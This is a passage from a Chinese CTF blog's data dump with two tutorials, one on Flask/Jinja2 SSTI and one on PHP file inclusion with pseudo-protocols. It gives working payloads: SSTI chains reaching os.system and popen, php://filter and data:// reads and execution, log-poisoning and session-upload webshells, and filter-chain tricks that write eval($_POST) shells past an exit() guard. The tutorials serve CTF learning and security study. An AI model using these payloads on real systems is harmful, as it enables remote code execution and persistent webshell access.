operator\">></span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">99</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__init__\n<span class=\"token operator\">&lt;</span>slot wrapper <span class=\"token string\">'__init__'</span> of <span class=\"token string\">'object'</span> objects<span class=\"token operator\">></span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>__class__<span class=\"token punctuation\">.</span>__mro__<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__subclasses__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">59</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>__init__\n<span class=\"token operator\">&lt;</span>unbound method WarningMessage<span class=\"token punctuation\">.</span>__init__<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>或者用模板控制语句找到可以利用的模块，或者<strong>builtins</strong></p>\n<p><img src=\"/img/image-20201222222733823.png\" alt=\"image-20201222222733823\"></p>\n<p>构造payload</p>\n<pre><code>''.__class__.__base__.__subclasses__()[59]\n\n''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']\n\n''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n\n''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')\n\n''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"whoami\").read()')</code></pre><script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"SSTI模板注入与Flask基础\"><a href=\"#SSTI模板注入与Flask基础\" class=\"headerlink\" title=\"SSTI模板注入与Flask基础\"></a>SSTI模板注入与Flask基础</h1><h3 id=\"Flask简介\"><a href=\"#Flask简介\" class=\"headerlink\" title=\"Flask简介\"></a>Flask简介</h3><p>Flask是一个Python上的<strong>Web应用程序框架</strong>（Web Application Framework）。</p>\n<p><strong>Web应用程序框架</strong>是一个库和模块的集合，使Web应用程序开发人员能够编写Web应用程序，而不必担心协议，线程管理等低级细节。</p>\n<p>Flask基于<strong>Werkzeug WSGI</strong>工具包和<strong>Jinja2</strong>模板引擎。</p>\n<blockquote>\n<h5 id=\"Werkzeug\"><a href=\"#Werkzeug\" class=\"headerlink\" title=\"Werkzeug\"></a>Werkzeug</h5><p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p>\n<h5 id=\"jinja2\"><a href=\"#jinja2\" class=\"headerlink\" title=\"jinja2\"></a>jinja2</h5><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>\n<p>Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。</p>\n</blockquote>\n<p><strong>Jinjia模板引擎特点</strong></p>\n<p><img src=\"/img/jinja2%E8%AF%AD%E6%B3%95.png\" alt=\"img\"></p>\n<p><strong>控制语句</strong></p>\n<p><img src=\"/img/image-20201222222445589.png\" alt=\"image-20201222222445589\"></p>\n<p> <strong>注意：不可以使用<code>continue</code>和<code>break</code>表达式来控制循环的执行。</strong></p>\n<p><strong>过滤器</strong></p>\n<p>过滤器是通过（<code>|</code>）符号进行使用的，例如：<code>0：</code>将返回name的长度。</p>\n<p>过滤器相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中。</p>\n<h2 id=\"SSTi漏洞的产生\"><a href=\"#SSTi漏洞的产生\" class=\"headerlink\" title=\"SSTi漏洞的产生\"></a>SSTi漏洞的产生</h2><p>ssti漏洞产生于网页模板中的变量被二次渲染时。</p>\n<p>什么是二次渲染，这里用两个例子简单展示：</p>\n<p>无二次渲染：</p>\n<pre><code class=\"python\">from flask import *\n\napp=Flask(__name__)\n@app.route(&#39;/&#39;)\ndef index():\n    str=request.args.get(&#39;s&#39;)\n    html=&#39;&lt;h1&gt;Welcome&lt;/h1&gt;&lt;/br&gt;&lt;p&gt;{{str}}&lt;/p&gt;&#39;\n    return render_template_string(html,str=str)\nif __name__==&#39;__main__&#39;:\n    app.run()</code></pre>\n<p>有二次渲染行为：</p>\n<pre><code class=\"python\">from flask import *\n\napp=Flask(__name__)\n@app.route(&#39;/&#39;)\ndef index():\n    str=request.args.get(&#39;s&#39;)\n    html=&quot;&lt;h1&gt;Welcome&lt;/h1&gt;&lt;/br&gt;&lt;p&gt;%s&lt;/p&gt;&quot;%(str)\n    return render_template_string(html)\nif __name__==&quot;__main__&quot;:\n    app.run()</code></pre>\n<p>如果在页面中找到了这样一个ssti漏洞，便意味着我们能够在这个注入点执行该模板引擎的控制语句以及命令</p>\n<p>Flask SSTI 题的基本思路就是利用 python 中的 <strong>魔术方法</strong> 找到自己要用的函数。</p>\n<pre><code>__dict__：保存类实例或对象实例的属性变量键值对字典\n\n__class__：返回调用的参数类型\n\n__mro__：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 \n\n__base__: 返回该对象所继承的基类\n\n__bases__：返回该对象所继承的类型列表\n\n__subclasses__：以一个列表的形式返回对象的子类\n\n__init__：类的初始化方法\n\n__globals__：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre><p>基本步骤：</p>\n<p>使用魔术方法进行函数解析，再获取基本类：</p>\n<pre><code class=\"python\">&#39;&#39;.__class__.__mro__[2]\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8] //针对jinjia2/flask为[9]适用</code></pre>\n<p>获取基本类后，继续向下获取基本类 object 的子类：</p>\n<pre><code class=\"python\">object.__subclasses__()</code></pre>\n<p>这里有可能子类中就含有可以利用的函数，如file,eval等，但是一般是没有的</p>\n<p>可以用以下模板控制语句找找看</p>\n<p><img src=\"/img/image-20201222222642704.png\" alt=\"image-20201222222642704\"></p>\n<p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p>\n<pre><code class=\"python\">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[99].__init__\n&lt;slot wrapper &#39;__init__&#39; of &#39;object&#39; objects&gt;\n&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__\n&lt;unbound method WarningMessage.__init__&gt;</code></pre>\n<p>或者用模板控制语句找到可以利用的模块，或者<strong>builtins</strong></p>\n<p><img src=\"/img/image-20201222222733823.png\" alt=\"image-20201222222733823\"></p>\n<p>构造payload</p>\n<pre><code>&#39;&#39;.__class__.__base__.__subclasses__()[59]\n\n&#39;&#39;.__class__.__base__.__subclasses__()[81].__init__.__globals__[&#39;__builtins__&#39;]\n\n&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)\n\n&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)\n\n&#39;&#39;.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></pre>"},{"layout":"post","title":"文件包含+伪协议","date":"2020-12-06T16:00:00.000Z","description":"转自Myon9s大佬","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n[转自Myon9s大佬的博客]: http://myangswhitehat.cn/\t\"http://myangswhitehat.cn/\"\n\n\n\n# 前言\n\n最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下\n\n之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。\n\n废话不多说，这次主要是对文件包含以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。\n\n如果文档涉及到知识性的错误，欢迎与我来讨论\n\n联系方式 `512615513@qq.com`\n\n## 前置知识\n\n你需要了解的：\n\n* PHP相关函数\n\n  * include\n  * file_get_content\n  * file_put_content\n  * ......等等\n  * 附图：\n\n  ![BK_7E701ZG321YVC7J9MACP.png](https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png)\n\n* PHP伪协议\n\n  * php://filter\n  * data://\n  * file://\n\n  ​     等等\n\n  `https://www.freebuf.com/column/148886.html` 对伪协议的一个讲解文章。\n\n  适用环境附图：\n\n  ![123.png](https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png)\n\n## 本地环境测试\n\n在阿清出的一道反序列化的题目中，使用伪协议发现了问题，发现打不通，然后本地测试了一下\n\n```php\n<?php\n\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n include($ceshi);\n?>\n```\n\n配合伪协议`php://filter`，payload为：`http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php` 可以读到base64编码后的flag\n\n如果换成 `$_post['ceshi']` 呢，答案是一样的。\n\n改一下源代码：\n\n```php\n <?php\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n echo file_get_contents($ceshi);\n ?> \n```\n\n同样我们配合 `php://filter` 伪协议，payload为：`http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php` 可以读到base64编码后的flag，换成POST传参形式亦然。\n\n然后我们再来尝试一下data协议 (这里测试的时候注意更改一下 php.ini 的配置，默认allow_url_include 是 off)\n\n```php\n<?php\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n include($ceshi);\n?>\n```\n\n利用data:// 伪协议配合include函数可以执行包含文本内容：\n\n`ceshi=data:text/plain,helloworld`\n\n![BHKG_M9_ZR_8W4K@6PVUS`I.png](https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png)\n\n同样，我们利用data://伪协议配合include函数可以执行PHP语句:\n\n`ceshi=data:text/plain,<?php phpinfo();?>`\n\n![_V8KVS~VX___1`I_2_7V28P.png](https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png)\n\n如上图，这里本质上是使用data协议 包含了文本内容，文本内容为 `<?php phpinfo();?>` 然后被解析成PHP语句执行并返回结果。\n\n我们尝试一下`file_get_contents()`函数是不是也支持呢？测试一下：\n\n![J_C4AEA2CN4TNWJ040_O__P.png](https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png)\n\n然后我们尝试一下是不是也能支持PHP命令执行。\n\n![image-20201130165635700](C:\\Users\\86186\\AppData\\Roaming\\Typora\\typora-user-images\\image-20201130165635700.png)\n\n显然，并不如我们想要的那样。\n\n为什么会出现这种原因，本质上还是在于对函数功能的理解，这两个函数 include和file_get_contents函数都是支持data伪协议的，这里的data协议用来获取文本数据，然后被include**包含**在当前php文件中，自然而然的就被解析成php代码，而file_get_contents函数只是获取文本的内容，而不是包含，所以没有被解析，从而造成代码执行。\n\n以上两个函数的本地测试只是想说明:\n\n* 存在一部分函数，它们是支持伪协议，并且配合伪协议可以达到一些意想不到的效果。\n* 同样是支持伪协议，但是不同函数的功能配合伪协议产生的效果也会很不一样。\n\n接下来对一些函数配合伪协议达到的妙用进行一个小结。\n\n## include+伪协议\n\n### php://filter/read 协议读源码\n\n姿势：\n\n`ceshi=php://filter/read=convert.base64-encode/resource=flag.php`\n\n`ceshi=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php`\n\n这里的读取出来的编码可以有多种方式（后面看了利用编码写操作就发现多么骚了。），`base64、utf-8、utf-16`等等，有时候会被过滤，换着绕，另外本地测试发现用这个协议的时候，除了convert那里不能动，其他都可以换成大写小写混着，用这个trick可以绕过一些过滤。\n\n### data协议 \n\n可以利用data协议来执行PHP语句:\n\n姿势：\n\n`data://text/plain,<?php system('ls');?>` 这里加不加 //都可。\n\n利用base64编码来绕过\n\n`data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+`  等效于执行 system('ls');\n\n本地测试发现，除了data不能动，其他都可以混用大小写来达到绕过的目的。\n\n### include+php://input\n\n```php\n<?php\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n include($ceshi);\n?>\n```\n\n仍然是这个代码，我们可以利用php://input 协议，利用如下：\n\n`?ceshi=php://input`  然后 post 直接传数据  : `<?php system('ls');` ，这里POST数据可控。\n\n不过这里有要求，当编码格式为 `enctype=\"multipart/form-data\"`  php://input是无效的。\n\n关于编码格式的解释，贴上一篇博客。\n\n`https://blog.csdn.net/lingxiyizhi_ljx/article/details/102514560`\n\n### include+file协议\n\n我们这里可以直接用file协议读取本地文件系统的文件，需要使用绝对路径。\n\n`?ceshi=file:///etc/passwd` ，这里前提是文件可访问。\n\n**大小写这个似乎对PHP的版本有要求，不同的版本有的可以，有的不行。**\n\n## include+可控文件\n\n文件包含的本质是包含一些危险代码，或者是webshell，如果一个文件的内容可控，我们包含之，就可以getshell\n\n### 包含日志文件 \n\n我们在UA头那里包含我们的一句话木马，然后包含日志文件，以nginx为例，日志路径为 /var/log/nginx/access.log \n\n![V85BD_E14H_XTZP`6K__XON.png](https://i.loli.net/2020/12/01/NP3yxK8haqInJke.png)\n\n 传过去，然后蚁剑连接，连接路径为 :  `https://127.0.0.1/ceshi.php?file=/var/log/nginx/access.log`\n\n### 利用session.upload_progress \n\n这个思路听说早就有了，但是上上周才接触到，还是学的太少了。\n\n有一篇文章对 `session.upload_progress`讲的挺好，这里贴上链接：`https://www.freebuf.com/news/202819.html)`\n\n简单来说就是上传一个 PHP_SESSION_UPLOAD_PROGRESS 文件，文件内容可以写上我们的shell。然后包含 /tmp/sess_xxx，这里xxx是可控的。然后在利用条件竞争（因为会被删除掉），这里可以直接抓包，利用 intruder模块来进行条件竞争。\n\n附上一个师傅的上传脚本：\n\n```\n#poc.php\n<!DOCTYPE html>\n<html>\n<body>\n<form action=\"ip\" method=\"POST\" enctype=\"multipart/form-data\">\n<input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"2333\" />\n<input type=\"file\" name=\"file\" />\n<input type=\"submit\" value=\"submit\" />\n</form>\n</body>\n</html>\n<?php\n    session_start();\n?>\n```\n\n抓包图：(用的师傅的一张。\n\n![W13K__CM_MV_5V8F_29_VX8.png](https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png)\n\n有时候打不出来，可能是条件竞争没有成功，还没包含就被删掉了，可以考虑线程开大一点。\n\n### 小结\n\ninclude + 伪协议来 getshell ，不局限于这两个文件，只要：\n\n* 文件内容可控\n* 文件可以被访问（也就是可以被包含）\n\n就可以成功getshell。\n\n## file_get_contents + 伪协议\n\n前面的那个本地测试的demo，对 php://filter和data://text 做了说明，其实 file_get_contents还可以结合 php://input\n\ndemo:\n\n```\n\n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \n  \nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \n    echo \"hello admin!<br>\";  \n    include($file); //hint.php  \n}else{  \n    echo \"you are not admin ! \";  \n}  \n\n```\n\n这里其他不看，单纯来看 `(file_get_contents($user,'r')===\"welcome to the bugkuctf\")` 直接传 $user=\"welcome xxx\" 肯定是不现实的，因为这里是以文件的形式打开，所以我们这里可以尝试 ?user=php://input 然后post数据 welcome to the bugkuctf 即可，post的内容即会被识别为文件内容。\n\n## file_put_content+伪协议\n\n### 写在前面\n\nfile_put_contents 结合伪协议来写马，有着很多很骚的操作，其本质也是大同小异，就是利用过滤器编码来做一些操作。关于file_put_contents结合伪协议的考察，之前也遇到过，一直没有做个总结，现总结如下：\n\n### demo1\n\n```php\n<?php\n highlight_file(__FILE__);\n $filename=$_GET['filename'];\n $content=$_GET['content'];\n file_put_contents($filename,\"<?php exit();\".$content);\n?>\n```\n\n#### 利用base64\n\n这个之前在P牛的文章里面有提到过。原文章链接:\n\n`https://www.leavesongs.com/PENETRATION/php-filter-magic.html`\n\nbase64是每4个字符进行编码，这里的 php exit 一共 7个字符，我们需要手动添上一个字符，剩下的就是我们可控代码了。\n\n`?filename=php://filter/write/convert.base64-decode/resource=1.php&content=XPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs=`  (这里的X是手动添加为了和前面凑8个\n\n![111.png](https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png)\n\n#### 利用rot13\n\n一个在线rot13编码解码的网站：\n\nhttp://www.mxcz.net/tools/rot13.aspx\n\n`?filename=php://filter/write=string.rot13/resource=2.php&content=<?cuc riny($_CBFG['pzq']);`\n\n![112.png](https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png)\n\n可以发现成功写入shell，但是有个局限，如果开启了**php短标签**，这个就无效了。就会报错。\n\n#### 利用string.strip_tags结合.htaccess\n\n这个可以过滤掉PHP HTML标签  `<?php ?>` 中内容是可以直接吃完的。\n\n如果是Apache服务器，我们可以配合`.htaccess`文件来包含文件:\n\n`filename=php://filter/write=string.strip_tags/resource=.htaccess&content=>php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php`\n\n可以看到成功写入：\n\n![113.png](https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png)\n\n然后访问：\n\n![115.png](https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png)\n\n该方法适用：\n\n*  PHP5版本可以，PHP7不行，7.3版本已废除这个标签\n* apache环境\n* 文件名以及路径已知\n\n#### 过滤器编码组合\n\n顾名思义，就是利用过滤器的**嵌套**，来实现我们的目的。\n\n还是针对demo1的代码进行测试：\n\n我们传入 `?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=4.php&content=?>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==`\n\n![1.png](https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png)\n\n可以看到成功写入。\n\n不过因为  `string.strip_tags`的原因，这个方法在PHP7版本还是会有局限性，但是在PHP5环境下是适用的。\n\n另一种方式，针对PHP7环境下：\n\n`filename=php://filter/write=zlib.deflate|string.tolower|zlib.inflate/resource=5.php&content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=5.php`  \n\n压缩、转小写、解压，消去死亡exit，成功带入我们的 webshell\n\n![2.png](https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png)\n\n再来看看demo2 ~\n\n### demo2\n\n```php\n<?php\n highlight_file(__FILE__);\n $content=$_GET['content'];\n file_put_contents($content,\"<?php exit();\".$content);\n?>\n```\n\n这个相较于demo1区别是，同一变量。\n\n#### 利用base64\n\n一开始还是想到使用base64编码：\n\n`?content=php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+` 拼接后内容就是\n\n`<?php exit();php://filter/write/convert.base64-decode/resource=1.phpPD9waHAgcGhwaW5mbygpOz8+` 但是没有成功，因为'='在base64编码中代表结束，所以等号后面还接上字母，会报错，转码不出来。\n\n所以这里可以结合 `string.strip_tags` 来去掉等号：\n\n`?content=php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8+.php`\n\n在windows下，这种文件名的存在是很怪异的，但是在linux下测试是可行的：\n\n![3.png](https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png)\n\n当然这个方式还是针对于PHP5\n\n`?content=php://filter/write=string.rot13|<?cuc cucvasb();?>/resource=7.php`\n\n这里我们传过去可以看到：\n\n![4.png](https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png)\n\n访问 7.php文件，可以看到 phpinfo文件，同理我们可以构造shell\n\n#### 利用rot13\n\n这里我们依然可以利用rot13，`?content=php://filter/write=string.rot13|<?cuc cucvasb();?>|/resource=8.php` \n\n![1233.png](https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png)\n\n可以发现，用rot13成功写入，不过仍然存在短标签的问题。\n\n#### 利用usc-2\n\n通过usc-2编码，两位一反转。\n\n`?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?<hp%20pe@av(l_$OPTSs[m1lp]e;)>?/resource=9.php`\n\n![12.png](https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png)\n\n可以看到成功写入，并且将前面的死亡代码糅杂消失。\n\n#### 利用usc-4\n\n和usc-2原理基本一致，不过这里是四位一反转。\n\n`?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?<e@%20p(lavOP_$s[TS]pm1>?;)/resource=10.php`\n\n#### utf-8、utf-7转换\n\n测试发现：\n\n![13.png](https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png)\n\n等号经过`utf-7`编码后会变成 +AD0- ，这样就可以消除等号的影响。并且：\n\n![14.png](https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png)\n\n纯字符经过 `utf-7` 编码 ，和原来不会有太大区别，所以可以结合 utf7和base64解码来写马\n\n`?content=php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=10.php`\n\n本地可以看到已经成功写入：\n\n![123.png](https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png)\n\n### demo3\n\n```php\n<?php\n highlight_file(__FILE__);\n $filename=$_GET['filename'];\n $content=$_GET['content'];\n file_put_contents($filename,$content . \"\\nxxxxxx\");\n?>\n```\n\n其实可以直接写 `?content=<?php phpinfo();?>` 但其实题目一般都会有过滤，可能是过滤掉 起始符号 <? ，这个时候我们可以利用 `.htaccess`\n\n但是 `.htaccess` 文件，对内容要求很严格，多余冗杂的代码会导致文件失效和错误。所以我们考虑注释符。\n\ns1mple师傅的payload:\n\n`?filename=.htaccess&content=php_value%20auto_prepend_file%20D:\\phpStudy\\PHPTutorial\\WWW\\flag.php%0a%23\\`\n\n我自己本地测试发现，在windows下不能使那个换行无效...，而在linux下似乎也不可行。后面有人如果能复现或者自己有思路可以绕过去的，欢迎与我讨论~\n\n参考链接：\n\n`https://xz.aliyun.com/t/8163#toc-2`\n\n\n\n\n\n\n\n","source":"_posts/2020-12-07-php伪协议（转自My0n9s大佬）.md","raw":"---\nlayout: post\ntitle: 文件包含+伪协议\ndate: 2020-12-07\ncategories: blog\ntags: [web,php]\ndescription: 转自Myon9s大佬\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n[转自Myon9s大佬的博客]: http://myangswhitehat.cn/\t\"http://myangswhitehat.cn/\"\n\n\n\n# 前言\n\n最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下\n\n之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。\n\n废话不多说，这次主要是对文件包含以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。\n\n如果文档涉及到知识性的错误，欢迎与我来讨论\n\n联系方式 `512615513@qq.com`\n\n## 前置知识\n\n你需要了解的：\n\n* PHP相关函数\n\n  * include\n  * file_get_content\n  * file_put_content\n  * ......等等\n  * 附图：\n\n  ![BK_7E701ZG321YVC7J9MACP.png](https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png)\n\n* PHP伪协议\n\n  * php://filter\n  * data://\n  * file://\n\n  ​     等等\n\n  `https://www.freebuf.com/column/148886.html` 对伪协议的一个讲解文章。\n\n  适用环境附图：\n\n  ![123.png](https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png)\n\n## 本地环境测试\n\n在阿清出的一道反序列化的题目中，使用伪协议发现了问题，发现打不通，然后本地测试了一下\n\n```php\n<?php\n\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n include($ceshi);\n?>\n```\n\n配合伪协议`php://filter`，payload为：`http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php` 可以读到base64编码后的flag\n\n如果换成 `$_post['ceshi']` 呢，答案是一样的。\n\n改一下源代码：\n\n```php\n <?php\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n echo file_get_contents($ceshi);\n ?> \n```\n\n同样我们配合 `php://filter` 伪协议，payload为：`http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php` 可以读到base64编码后的flag，换成POST传参形式亦然。\n\n然后我们再来尝试一下data协议 (这里测试的时候注意更改一下 php.ini 的配置，默认allow_url_include 是 off)\n\n```php\n<?php\n highlight_file(__FILE__);\n $ceshi=$_GET['ceshi'];\n include($ceshi);\n?>\n```\n\n利用data:// 伪协议配合include函数可以执行包含文本内容：\n\n`ceshi=data:text/plain,helloworld`\n\n![BHKG_M9_ZR_8W4K@6PVUS`I.png](https://i.loli.net/2020/11/30/gNRqxLoirwlHF5p.png)\n\n同样，我们利用data://伪协议配合include函数可以执行PHP语句:\n\n`ceshi=data:text/plain,<?php phpinfo();?>`\n\n![_V8KVS~VX___1`I_2_7V28P.png](https://i.loli.net/2020/11/30/kjOEGUcSZxa3iDm.png)\n\n如上图，这里本质上是使用data协议 包含了文本内容，文本内容为 `<?php phpinfo();?>` 然后被解析成PHP语句执行并返回结果。\n\n我们尝试一下`file_get_contents()`函数是不是也支持呢？测试一下：\n\n![J_C4AEA2CN4TNWJ040_O__P.png](https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png)\n\n然后我们尝试一下是不是也能支持PHP命令执行。\n\n![image-20201130165635700](C:\\Users\\86186\\AppData\\Roaming\\Typora\\typora-user-images\\image-20201130165635700.png)\n\n显然，并不如我们想要的那样。\n\n为什么会出现这种原因，本质上还是在于对函数功能的理解，这两个函数 